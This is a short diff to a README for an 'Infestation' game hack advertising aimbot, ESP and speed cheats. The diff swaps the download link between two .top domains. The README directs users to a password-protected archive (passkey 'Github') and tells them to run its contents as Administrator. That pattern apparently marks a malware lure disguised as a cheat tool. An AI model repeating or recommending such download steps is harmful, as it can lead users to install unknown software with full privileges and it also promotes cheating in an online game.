@@ -6,7 +6,7 @@ Infestation external hack with ESP, aimbot, loot radar, no recoil, and speed hac
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ Based on community CE tables and advanced external memory reading techniques.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Infestation.
 4. Run the hack **as Administrator**.
